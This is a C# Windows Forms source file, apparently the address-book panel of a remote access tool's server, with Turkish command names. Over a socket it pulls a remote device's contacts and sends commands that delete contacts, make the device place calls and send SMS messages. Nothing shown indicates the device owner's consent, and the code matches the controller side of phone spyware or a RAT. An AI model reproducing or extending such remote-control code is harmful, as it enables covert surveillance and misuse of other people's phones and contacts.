using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace Server.Views
{
    public partial class AddressBook : Form
    {
        Socket socket;
        public string Id = "";
        /// <summary>
        /// Creates a new <see cref="AddressBook"/> instance
        /// </summary>
        /// <param name="socket"></param>
        /// <param name="id"></param>
        public AddressBook(Socket socket, string id)
        {
            InitializeComponent();
            Id = id; this.socket = socket;
        }
        public void bilgileriIsle(string arg)
        {
            listView1.Items.Clear();
            if (arg != "REHBER YOK")
            {
                string[] ana_Veriler = arg.Split('&');
                for (int k = 0; k < ana_Veriler.Length; k++)
                {
                    try
                    {
                        string[] bilgiler = ana_Veriler[k].Split('=');
                        ListViewItem item = new ListViewItem(bilgiler[0]);
                        item.ImageIndex = 0;
                        item.SubItems.Add(bilgiler[1]);
                        listView1.Items.Add(item);
                    }
                    catch (Exception) { }
                }
            }
            else
            {
                ListViewItem item = new ListViewItem("Rehber Yok.");
                listView1.Items.Add(item);
            }
        }
        private void ekleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new AddContact(socket).Show();
        }

        private void silToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MainWindow.GoToOurSocket("REHBERSIL", "[VERI]" + listView1.SelectedItems[0].Text + "[VERI][0x09]", socket);
                listView1.SelectedItems[0].Remove();
                Text = "Adress Book";
            }
            catch (Exception) { }
        }

        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MainWindow.GoToOurSocket("REHBERIVER", "[VERI][0x09]", socket);
                Text = "Adress Book";
            }
            catch (Exception) { }
        }

        private void araToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                try
                {
                    MainWindow.GoToOurSocket("ARA", "[VERI]" + listView1.SelectedItems[0].SubItems[1].Text + "[VERI][0x09]", socket);
                    MessageBox.Show("Arama talimatı gönderildi.", "Arama", MessageBoxButtons.OK, MessageBoxIcon.Information);

                }
                catch (Exception) { }
            }
        }

        private void smsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                new SMS(socket, listView1.SelectedItems[0].SubItems[1].Text).Show();
            }
        }

        private void kopyalaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text);
            }
        }
    }
}
